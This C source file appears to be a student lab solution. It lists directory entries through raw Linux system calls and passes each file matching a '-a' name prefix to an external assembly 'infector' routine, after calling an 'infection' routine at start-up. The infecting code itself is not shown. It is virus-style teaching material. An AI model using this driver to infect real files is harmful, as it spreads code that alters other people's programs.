#include "util.h"

/* * Explicitly define the directory entry structure 
 * exactly as the lab PDF describes, avoiding any need for dirent.h 
 */
struct ent {
    int inode;
    int offset;
    short len;
    char buf[1];
};

/* Assembly glue functions */
extern int system_call();
extern void infection();
extern void infector(char* filename);

/* System call numbers for 32-bit Linux */
#define SYS_EXIT      1
#define SYS_READ      3
#define SYS_WRITE     4
#define SYS_OPEN      5
#define SYS_CLOSE     6
#define SYS_GETDENTS  141

#define O_RDONLY      0
#define BUF_SIZE      8192

int main(int argc, char *argv[], char *envp[]) {
    int fd, nread;
    char buf[BUF_SIZE];
    int bpos;
    struct ent *d;
    char *prefix = 0; 
    int i;

    /* ---------------------------------------------------------
     * Optional: Task 2.A test payload
     * Uncomment this if you want it to print the infection message
     * ---------------------------------------------------------*/
    infection();

    /* ---------------------------------------------------------
     * 1. Parse Command Line Arguments for "-a"
     * ---------------------------------------------------------*/
    for (i = 1; i < argc; i++) {
        if (strncmp(argv[i], "-a", 2) == 0) {
            prefix = argv[i] + 2; /* Set prefix pointer to whatever comes AFTER "-a" */
        }
    }

    /* ---------------------------------------------------------
     * 2. Open the Current Directory (".")
     * ---------------------------------------------------------*/
    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0);
    if (fd < 0) {
        system_call(SYS_EXIT, 0x55, 0, 0); /* Exit with 0x55 on error */
    }

    /* ---------------------------------------------------------
     * 3. Read Directory Entries (sys_getdents)
     * ---------------------------------------------------------*/
    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
    if (nread < 0) {
        system_call(SYS_EXIT, 0x55, 0, 0); /* Exit with 0x55 on error */
    }

    /* ---------------------------------------------------------
     * 4. Loop Through the Directory Entries
     * ---------------------------------------------------------*/
    for (bpos = 0; bpos < nread;) {
        /* Cast the buffer position to our custom ent struct */
        d = (struct ent *) (buf + bpos);
        
        /* In the lab's struct, the filename is stored in 'buf' */
        char *d_name = d->buf; 

        /* If a prefix was provided via -a */
        if (prefix != 0) {
            /* Check if the filename starts with the exact prefix */
            if (strncmp(d_name, prefix, strlen(prefix)) == 0) {
                system_call(SYS_WRITE, 1, d_name, strlen(d_name));
                system_call(SYS_WRITE, 1, "\n", 1);
                
                /* Optional for Task 2.C: Infect the matching file */
                infector(d_name);
            }
        } else {
            /* No prefix provided, print every file */
            system_call(SYS_WRITE, 1, d_name, strlen(d_name));
            system_call(SYS_WRITE, 1, "\n", 1);
        }

        /* Advance bpos by the length of the current record ('len') */
        bpos += d->len;
    }

    /* ---------------------------------------------------------
     * 5. Cleanup and Exit
     * ---------------------------------------------------------*/
    system_call(SYS_CLOSE, fd, 0, 0);
    
    return 0;
}